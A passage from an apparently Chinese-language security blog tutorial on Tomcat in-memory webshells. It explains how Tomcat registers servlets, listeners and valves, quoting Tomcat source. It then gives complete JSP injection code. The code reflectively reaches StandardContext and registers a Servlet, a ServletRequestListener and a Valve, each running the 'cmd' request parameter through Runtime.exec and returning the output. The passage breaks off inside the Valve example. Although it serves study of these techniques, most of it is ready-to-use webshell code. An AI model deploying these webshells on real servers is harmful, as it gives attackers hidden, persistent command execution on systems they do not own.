<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.tomcat.util.descriptor.web;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebXml</span> <span class="keyword">extends</span> <span class="title class_">XmlEncodingBase</span> <span class="keyword">implements</span> <span class="title class_">DocumentProperties</span>.Encoding,</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addServletMappingDecoded</span><span class="params">(String urlPattern, String servletName)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">oldServletName</span> <span class="operator">=</span> servletMappings.put(urlPattern, servletName);</span><br><span class="line">        <span class="keyword">if</span> (oldServletName != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(</span><br><span class="line">                    <span class="string">&quot;webXml.duplicateServletMapping&quot;</span>, oldServletName,</span><br><span class="line">                    servletName, urlPattern));</span><br><span class="line">        &#125;</span><br><span class="line">        servletMappingNames.add(servletName); <span class="comment">// 添加servlet映射</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结</strong></p>
<ul>
<li>在<code>StandardContext</code>的<code>children</code>属性中加入我们定义的<code>wrapper</code></li>
<li>在<code>servletMappingNames</code>属性中加入我们的<code>servlet</code>映射</li>
<li>设置<code>servlet</code>的<code>loadOnStartup</code>属性值大于0</li>
</ul>
<h4 id="Servlet内存马实例"><a href="#Servlet内存马实例" class="headerlink" title="Servlet内存马实例"></a>Servlet内存马实例</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;AddServlet&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 从ServletContext中反射获取ApplicationContext和StandardContext</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">servletURL</span> <span class="operator">=</span> <span class="string">&quot;/cmdServlet&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> <span class="string">&quot;CmdServlet&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;cmd&quot;</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建wrapper，设置我们的servlet</span></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">        wrapper.setName(servletName);</span><br><span class="line">        wrapper.setServlet(servlet);</span><br><span class="line">        wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">        <span class="comment">// 令loadOnStartup大于0</span></span><br><span class="line">        wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 添加到children属性中</span></span><br><span class="line">        standardContext.addChild(wrapper);</span><br><span class="line">        <span class="comment">// 设置servlet映射</span></span><br><span class="line">        standardContext.addServletMappingDecoded(servletURL, servletName);</span><br><span class="line"></span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h3><h4 id="Listener分类"><a href="#Listener分类" class="headerlink" title="Listener分类"></a>Listener分类</h4><ul>
<li><p>EventListener（修改属性时触发）</p>
<ul>
<li>ServletContextAttributeListener</li>
<li>ServletRequestAttributeListener</li>
<li>HttpSessionAttributeListener</li>
<li>ServletRequestAttributeListener</li>
</ul>
</li>
<li><p>LifecycleListener（在Servlet生命周期中触发）</p>
<ul>
<li>ServletContextListener</li>
<li>HttpSessionListener</li>
<li>ServletRequestListener</li>
</ul>
</li>
</ul>
<p><code>Listener</code>的种类有很多，但是有些不适用于作为内存马，比如<code>ServletContextListener</code>需要涉及到启动和停止服务器，<code>HttpSessionListener</code>需要设计<code>session</code>的创建和销毁，而<code>ServletRequestListener</code>只涉及到当前请求，所以最适合做内存马的是<code>ServletRequestListener</code></p>
<h4 id="listenerStart"><a href="#listenerStart" class="headerlink" title="listenerStart"></a>listenerStart</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StandardContext</span> <span class="keyword">extends</span> <span class="title class_">ContainerBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Context</span>, NotificationEmitter &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">startInternal</span><span class="params">()</span> <span class="keyword">throws</span> LifecycleException &#123;</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!listenerStart()) &#123; <span class="comment">// 调用listenerStart()函数</span></span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.listenerFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StandardContext</span> <span class="keyword">extends</span> <span class="title class_">ContainerBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Context</span>, NotificationEmitter &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">listenerStart</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">            log.debug(<span class="string">&quot;Configuring application event listeners&quot;</span>);</span><br><span class="line"></span><br><span class="line">        String listeners[] = findApplicationListeners(); <span class="comment">// 找到全部Linstener名字</span></span><br><span class="line">        Object results[] = <span class="keyword">new</span> <span class="title class_">Object</span>[listeners.length];</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; results.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (getLogger().isDebugEnabled())</span><br><span class="line">                getLogger().debug(<span class="string">&quot; Configuring event listener class &#x27;&quot;</span> +</span><br><span class="line">                    listeners[i] + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">listener</span> <span class="operator">=</span> listeners[i];</span><br><span class="line">                results[i] = getInstanceManager().newInstance(listener); <span class="comment">// 实例化Linstener</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                t = ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">                ExceptionUtils.handleThrowable(t);</span><br><span class="line">                getLogger().error(sm.getString(</span><br><span class="line">                        <span class="string">&quot;standardContext.applicationListener&quot;</span>, listeners[i]), t);</span><br><span class="line">                ok = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">            getLogger().error(sm.getString(<span class="string">&quot;standardContext.applicationSkipped&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        List&lt;Object&gt; eventListeners = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Object&gt; lifecycleListeners = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Object result : results) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((result <span class="keyword">instanceof</span> ServletContextAttributeListener)</span><br><span class="line">                    || (result <span class="keyword">instanceof</span> ServletRequestAttributeListener)</span><br><span class="line">                    || (result <span class="keyword">instanceof</span> ServletRequestListener)</span><br><span class="line">                    || (result <span class="keyword">instanceof</span> HttpSessionIdListener)</span><br><span class="line">                    || (result <span class="keyword">instanceof</span> HttpSessionAttributeListener)) &#123;</span><br><span class="line">                eventListeners.add(result);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((result <span class="keyword">instanceof</span> ServletContextListener)</span><br><span class="line">                    || (result <span class="keyword">instanceof</span> HttpSessionListener)) &#123;</span><br><span class="line">                lifecycleListeners.add(result); <span class="comment">// 把Linstener加入到lifecycleListeners</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));</span><br><span class="line">        setApplicationEventListeners(eventListeners.toArray());</span><br><span class="line">        <span class="keyword">for</span> (Object lifecycleListener: getApplicationLifecycleListeners()) &#123;</span><br><span class="line">            lifecycleListeners.add(lifecycleListener);</span><br><span class="line">            <span class="keyword">if</span> (lifecycleListener <span class="keyword">instanceof</span> ServletContextListener) &#123;</span><br><span class="line">                noPluggabilityListeners.add(lifecycleListener);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        setApplicationLifecycleListeners(lifecycleListeners.toArray());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getLogger().isDebugEnabled())</span><br><span class="line">            getLogger().debug(<span class="string">&quot;Sending application start events&quot;</span>);</span><br><span class="line"></span><br><span class="line">        getServletContext();</span><br><span class="line">        context.setNewServletContextListenerAllowed(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        Object instances[] = getApplicationLifecycleListeners();</span><br><span class="line">        <span class="keyword">if</span> (instances == <span class="literal">null</span> || instances.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ok;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ServletContextEvent</span> <span class="variable">event</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletContextEvent</span>(getServletContext()); <span class="comment">// 获取ServletContextEvent</span></span><br><span class="line">        <span class="type">ServletContextEvent</span> <span class="variable">tldEvent</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (noPluggabilityListeners.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            noPluggabilityServletContext = <span class="keyword">new</span> <span class="title class_">NoPluggabilityServletContext</span>(getServletContext());</span><br><span class="line">            tldEvent = <span class="keyword">new</span> <span class="title class_">ServletContextEvent</span>(noPluggabilityServletContext);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Object instance : instances) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> ServletContextListener)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ServletContextListener</span> <span class="variable">listener</span> <span class="operator">=</span> (ServletContextListener) instance;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fireContainerEvent(<span class="string">&quot;beforeContextInitialized&quot;</span>, listener);</span><br><span class="line">                <span class="keyword">if</span> (noPluggabilityListeners.contains(listener)) &#123;</span><br><span class="line">                    listener.contextInitialized(tldEvent);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    listener.contextInitialized(event); <span class="comment">// 调用Linstener的contextInitialized()函数</span></span><br><span class="line">                &#125;</span><br><span class="line">                fireContainerEvent(<span class="string">&quot;afterContextInitialized&quot;</span>, listener);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                ExceptionUtils.handleThrowable(t);</span><br><span class="line">                fireContainerEvent(<span class="string">&quot;afterContextInitialized&quot;</span>, listener);</span><br><span class="line">                getLogger().error(sm.getString(<span class="string">&quot;standardContext.listenerStart&quot;</span>,</span><br><span class="line">                        instance.getClass().getName()), t);</span><br><span class="line">                ok = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ok;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以这里的重点在于我们怎么把<code>Linstener</code>添加到<code>applicationListeners</code>属性中，通过属性调用找到了<code>addApplicationListener()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StandardContext</span> <span class="keyword">extends</span> <span class="title class_">ContainerBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Context</span>, NotificationEmitter &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationListener</span><span class="params">(String listener)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (applicationListenersLock) &#123;</span><br><span class="line">            String results[] = <span class="keyword">new</span> <span class="title class_">String</span>[applicationListeners.length + <span class="number">1</span>]; <span class="comment">// 获取Listener名字</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; applicationListeners.length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (listener.equals(applicationListeners[i])) &#123;</span><br><span class="line">                    log.info(sm.getString(<span class="string">&quot;standardContext.duplicateListener&quot;</span>,listener));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                results[i] = applicationListeners[i];</span><br><span class="line">            &#125;</span><br><span class="line">            results[applicationListeners.length] = listener;</span><br><span class="line">            applicationListeners = results; <span class="comment">// 传入我们的Linstenr</span></span><br><span class="line">        &#125;</span><br><span class="line">        fireContainerEvent(<span class="string">&quot;addApplicationListener&quot;</span>, listener);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结</strong></p>
<ul>
<li>直接调用<code>addApplicationListener</code>将我们的<code>Listener</code>添加到<code>StandardContext</code>的<code>applicationListeners</code>属性中</li>
</ul>
<h4 id="Listener内存马实例"><a href="#Listener内存马实例" class="headerlink" title="Listener内存马实例"></a>Listener内存马实例</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;AddLinstener&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 从ServletContext中反射获取ApplicationContext和StandardContext</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                        requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                        PrintWriter out= request.getResponse().getWriter();</span><br><span class="line">                        out.println(output);</span><br><span class="line">                        out.flush();</span><br><span class="line">                        out.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        standardContext.addApplicationEventListener(listener);</span><br><span class="line"></span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Valve内存马"><a href="#Valve内存马" class="headerlink" title="Valve内存马"></a>Valve内存马</h3><h4 id="Pineline"><a href="#Pineline" class="headerlink" title="Pineline"></a>Pineline</h4><p>在上面的Tomcat执行流程中讲到过<code>Pineline</code>的调用链，每一层的<code>valve</code>都会顺序调用，上层的<code>valve</code>会调用下层的<code>valve</code>，然后每次调用<code>valve</code>的<code>invoke()</code>方法</p>
<p>比如在<code>StandardHostValve</code>类中是这样调用<code>vavle</code>的<code>invoke()</code>方法的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> request.getContext(); <span class="comment">// 获取StandardContext</span></span><br><span class="line">...</span><br><span class="line">context.getPipeline().getFirst().invoke(request, response); <span class="comment">// 获取StandardContext的Valve</span></span><br></pre></td></tr></table></figure>

<p>然后在每一个<code>invoke()</code>里面又会递归调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getNext().invoke(request, response); <span class="comment">// 获取StandardContext的下一个Valve</span></span><br></pre></td></tr></table></figure>

<p>所以我们只需在<code>standardContext</code>中添加我们的<code>valve</code>，即可注入<code>Valve</code>内存马</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">standardContext.getPipeline().addValve(valve);</span><br></pre></td></tr></table></figure>

<h4 id="Valve内存马实例"><a href="#Valve内存马实例" class="headerlink" title="Valve内存马实例"></a>Valve内存马实例</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Valve&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;AddVavle&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 从ServletContext中反射获取ApplicationContext和StandardContext</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">Valve</span> <span class="variable">valve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Valve</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span 